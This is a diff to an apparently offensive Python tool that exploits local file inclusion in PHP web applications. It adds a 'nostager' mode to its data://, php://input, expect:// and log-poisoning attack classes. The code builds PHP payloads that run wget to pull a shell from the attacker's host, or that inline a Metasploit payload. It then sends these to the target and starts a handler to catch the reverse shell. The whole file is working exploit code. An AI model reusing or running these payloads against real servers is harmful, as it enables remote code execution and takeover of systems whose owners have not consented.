@@ -9,6 +9,7 @@ import subprocess
 import requests
 import base64
 import textwrap
+from urllib import quote_plus
 
 
 t = Terminal()
@@ -31,9 +32,10 @@ def progressbar():
 
 class Data:
 
-    def __init__(self, target):
+    def __init__(self, target, nostager):
 
         self.target = target
+        self.nostager = nostager
 
     def execute_data(self):
 
@@ -44,14 +46,6 @@ class Data:
             # Generate random shell name
             g = Generator()
             shell = g.generate()
-
-            # Build payload
-            payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
-            encoded_payload = payload.encode('base64')
-
-            # Build data wrapper
-            data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
-            lfi = self.target + data_wrapper
 
             print(t.green(" [*] ") + "Generating Data Wrapper")
             progressbar()
@@ -74,11 +68,30 @@ class Data:
 
             print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)
 
-            # Assuming if there is a server running on port 8000 hosting from /tmp
-            print(t.red(" [!] ") + "Is Your Server Running?")
-            print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
-            print(t.green(" [*] ") + "Downloading Shell")
-            progressbar()
+            # Build payload
+            if self.nostager:
+                payload_file = open("/tmp/{0}.php".format(shell),"r")
+                payload = payload_file.read()
+                payload_file.close()
+            else:
+                payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
+            encoded_payload = quote_plus(payload.encode('base64'))
+
+            # Build data wrapper
+            data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
+            lfi = self.target + data_wrapper
+
+            handle = Payload(lhost, lport, self.target, shell)
+            handle.handler()
+
+            if self.nostager:
+                raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...")
+            else:
+                # Assuming if there is a server running on port 8000 hosting from /tmp
+                print(t.red(" [!] ") + "Is Your Server Running?")
+                print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
+                print(t.green(" [*] ") + "Downloading Shell")
+                progressbar()
 
             # LFI payload that downloads the shell
             data_request = requests.get(lfi)
@@ -87,18 +100,16 @@ class Data:
             try:
                 if data_request.status_code != 200:
                     print(t.red(" [!] ") + "Unexpected HTTP Response ")
-                else:
-                    handle = Payload(lhost, lport, self.target, shell)
-                    handle.handler()
             except requests.exceptions.RequestException as data_error:
                 print(t.red(" [!] ") + "HTTP Error: %s" % data_error)
 
 
 class Input:
 
-    def __init__(self, target):
+    def __init__(self, target, nostager):
 
         self.target = target
+        self.nostager = nostager
 
     def execute_input(self):
 
@@ -110,10 +121,6 @@ class Input:
         g = Generator()
         shell = g.generate()
 
-        # Build php payload
-        wrapper = "php://input"
-        url = self.target + wrapper
-        payload = "<?php system('wget http://%s:8000/{0}.php'); ?>".format(shell)
 
         print(t.green(" [*] ") + "Generating Data Wrapper")
         progressbar()
@@ -134,28 +141,45 @@ class Input:
         else:
 
             print(t.green(" [*] ") + "Success!")
+            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+ 
+        # Build php payload
+        wrapper = "php://input"
+        url = self.target + wrapper
+        if self.nostager:
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = payload_file.read()
+            payload_file.close()
+        else:
+            payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost,shell)
+            
+        if self.nostager:
+            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+        else: 
+            # Assuming if there is a server running on port 8000 hosting from /tmp
+            print(t.red(" [!] ") + "Is Your Server Running?")
+            print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
+            print(t.green(" [*] ") + "Downloading Shell")
+            progressbar()
 
-        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
-        print(t.green(" [*] ") + "Downloading Shell")
-        progressbar()
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
 
         # Try block for actual attack
         try:
             dr = requests.post(url, data=payload)
             if dr.status_code != 200:
                 print t.red(" [*] Unexpected HTTP Response ")
-            else:
-                handle = Payload(lhost, lport, self.target, shell)
-                handle.handler()
         except requests.exceptions.RequestException as input_error:
             print t.red(" [*] HTTP Error ") + str(input_error)
 
 
 class Expect:
 
-    def __init__(self, target):
+    def __init__(self, target, nostager):
 
         self.target = target
+        self.nostager = nostager
 
     def execute_expect(self):
 
@@ -166,10 +190,6 @@ class Expect:
         # Generate random shell name
         g = Generator()
         shell = g.generate()
-
-        # Build payload
-        payload = "expect://wget http://{0}:8000/{1}.php".format(lhost, shell)
-        lfi = self.target + payload
 
         print(t.green(" [*] ") + "Generating Payload")
         progressbar()
@@ -188,17 +208,29 @@ class Expect:
         else:
             print(t.green(" [*] ") + "Success!")
 
-        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
-        print(t.green(" [*] ") + "Downloading Shell")
-        progressbar()
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
+        # Build payload
+        if self.nostager:
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = "expect://echo \""
+            payload += quote_plus(payload_file.read().replace("\"","\\\"").replace("$","\\$"))
+            payload += "\" | php"
+            payload_file.close()
+            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+        else:
+            payload = "expect://wget http://{0}:8000/{1}.php".format(lhost, shell)
+            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+            print(t.green(" [*] ") + "Downloading Shell")
+            progressbar()
+        lfi = self.target + payload
+
 
         try:
             r = requests.get(lfi)
             if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
-            else:
-                handle = Payload(lhost, lport, self.target, shell)
-                handle.handler()
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ") (expect_error)
 
@@ -220,8 +252,6 @@ class Logs:
         g = Generator()
         shell = g.generate()
 
-        payload = "<? system('wget http://{0}:8000/{1}.php') ?>".format(lhost, shell)
-        lfi = self.target + self.location
 
         print(t.green(" [*] ") + "Generating Payload")
         progressbar()
@@ -240,9 +270,20 @@ class Logs:
         else:
             print(t.green(" [*] ") + "Success!")
 
-        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
-        print(t.green(" [*] ") + "Downloading Shell")
-        progressbar()
+        if self.nostager:
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = payload_file.read()
+            payload_file.close()
+            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+        else:
+            payload = "<?php system('wget http://{0}:8000/{1}.php') ?>".format(lhost, shell)
+            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+            print(t.green(" [*] ") + "Downloading Shell")
+            progressbar()
+        lfi = self.target + self.location
+
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
 
         try:
             headers = {'User-Agent': payload}
@@ -253,9 +294,6 @@ class Logs:
                 r = requests.get(lfi)  # pull down shell from poisoned logs
                 if r.status_code != 200:
                     print(t.red(" [!] Unexpected HTTP Response "))
-                else:
-                    handle = Payload(lhost, lport, self.target, shell)
-                    handle.handler()
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ")(expect_error)
 
